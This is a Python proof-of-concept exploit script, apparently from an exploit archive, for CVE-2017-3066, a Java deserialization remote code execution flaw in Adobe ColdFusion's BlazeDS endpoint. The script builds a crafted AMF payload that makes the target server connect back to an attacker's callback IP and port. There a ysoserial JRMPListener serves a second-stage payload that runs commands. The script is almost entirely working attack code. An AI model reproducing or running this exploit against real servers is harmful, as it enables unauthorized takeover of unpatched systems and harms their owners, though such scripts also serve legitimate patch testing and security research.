# Exploit Title: Adobe Coldfusion BlazeDS Java Object Deserialization RCE
# Date: February 6, 2018
# Exploit Author: Faisal Tameesh (@DreadSystems)
# Company: Depth Security (https://depthsecurity.com)
# Version: Adobe Coldfusion (11.0.03.292866)
# Tested On: Windows 10 Enterprise (10.0.15063)
# CVE: CVE-2017-3066
# Advisory: https://helpx.adobe.com/security/products/coldfusion/apsb17-14.html
# Category: remote

# Notes:
# This is a two-stage deserialization exploit. The code below is the first stage.
# You will need a JRMPListener (ysoserial) listening at callback_IP:callback_port.
# After firing this exploit, and once the target server connects back, 
# JRMPListener will deliver the secondary payload for RCE.

import struct
import sys
import requests

if len(sys.argv) != 5:
    print "Usage: ./cf_blazeds_des.py target_IP target_port callback_IP callback_port"
    quit()

target_IP = sys.argv[1]
target_port = sys.argv[2]
callback_IP = sys.argv[3]
callback_port = sys.argv[4]

amf_payload = '\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff\x11\x0a' + \
              '\x07\x33' + 'sun.rmi.server.UnicastRef' + struct.pack('>H', len(callback_IP)) + callback_IP + \
              struct.pack('>I', int(callback_port)) + \
              '\xf9\x6a\x76\x7b\x7c\xde\x68\x4f\x76\xd8\xaa\x3d\x00\x00\x01\x5b\xb0\x4c\x1d\x81\x80\x01\x00';

url = "http://" + target_IP + ":" + target_port + "/flex2gateway/amf"
headers = {'Content-Type': 'application/x-amf'}
response = requests.post(url, headers=headers, data=amf_payload, verify=False)

